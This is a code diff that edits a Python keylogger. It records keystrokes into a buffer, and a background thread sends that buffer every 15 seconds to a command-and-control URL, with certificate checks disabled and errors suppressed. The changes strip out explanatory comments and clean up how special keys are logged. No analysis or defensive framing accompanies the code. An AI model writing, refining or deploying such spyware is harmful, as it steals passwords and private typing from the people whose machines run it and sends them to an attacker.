@@ -10,14 +10,14 @@ lock = threading.Lock()
 def beacon():
     global buffer
     while True:
-        time.sleep(15)  # Every 15 seconds
+        time.sleep(15)
         with lock:
             if buffer:
                 data = "".join(buffer)
                 try:
                     requests.post(C2_URL, data={"k": data}, verify=False, timeout=5)
                 except:
-                    pass  # Fail silently
+                    pass
                 buffer = []
 
 def on_press(key):
@@ -25,9 +25,10 @@ def on_press(key):
         try:
             buffer.append(key.char)
         except AttributeError:
-            buffer.append(f" [{key}] ")
+            key_str = str(key).replace("Key.space", " ")
+            key_str = key_str.replace("Key.", "")
+            buffer.append(f" [{key_str}] ")
 
-# Start beacon thread
 t = threading.Thread(target=beacon, daemon=True)
 t.start()
 
